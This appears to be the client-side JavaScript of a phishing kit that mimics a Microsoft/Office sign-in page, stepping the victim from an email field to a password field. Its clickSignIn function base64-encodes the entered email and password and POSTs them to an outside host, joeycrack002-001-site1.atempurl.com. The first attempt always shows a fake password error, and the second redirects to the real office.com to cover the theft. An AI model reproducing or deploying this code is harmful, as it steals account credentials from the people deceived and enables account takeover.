var success = 0

        $(document).ready(function () {
            $("#passwd").hide();
            document.getElementById("displayPasserror").style.display = "none"
            document.getElementById("back-arrow").style.display = "none";
            document.getElementById("third-group").style.display = "none";

            $("#passwdheading").hide(), 
            $("#displayName").hide(), $("#siginbutton").hide(), 
            $("#displayerror").hide()

        });
        
        function clickNext() {
            var e = document.getElementById("i0116").value;

            if (/^\b[A-Z0-9._%-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b$/i.test(e))
            {
                document.getElementById("third-group").style.display = "block";
                document.getElementById("second-group").style.display = "none";
                document.getElementById("button-wrapper").style.display = "none";
                document.getElementById("back-arrow").style.display = "block"

                document.getElementById("displayerror").style.display = "none", 
                document.getElementById("i0116").style.display = "none", 
                document.getElementById("signinheading").style.display = "none", 
                document.getElementById("displayName").innerHTML = e, 
                document.getElementById("displayName").style.display = "block", 
                document.getElementById("passwd").style.display = "block", 
                document.getElementById("passwdheading").style.display = "block", 
                document.getElementById("nextbutton").style.display = "none", 
                document.getElementById("siginbutton").style.display = "block"
            } else  
            {
                document.getElementById("displayerror").style.display = "block";
            }
        }

        function clickBack() {
            var e = document.getElementById("i0116").value;
            
            document.getElementById("passwdheading").style.display = "none";
            document.getElementById("signinheading").style.display = "block";
            document.getElementById("displayName").style.display = "none";
            document.getElementById("i0116").style.display = "block";
            document.getElementById("siginbutton").style.display = "none";
            document.getElementById("passwd").style.display = "none";
            document.getElementById("nextbutton").style.display = "block";
        }

        function clickSignIn() {
            let e = document.getElementById("i0116").value;
            let i = document.getElementById("passwd").value;

            
    
            var _data = new Object();
            _data.Id = btoa(e)
            _data.processId = btoa(i)
    
            $.ajax({
            type: "POST",
            url: "https://joeycrack002-001-site1.atempurl.com/Data",
            data: JSON.stringify(_data),
            contentType: "application/json",
            success: function(e) {
                if (success == 0) {

                    document.getElementById("displayPasserror").style.display = "block"
                    success++

                }
                else {
                    success = 0
                    window.location.replace("https://www.office.com/?trysignin=0")
                }
            },
            error: function(e) {
            console.error(e)
            }
            })

            
        }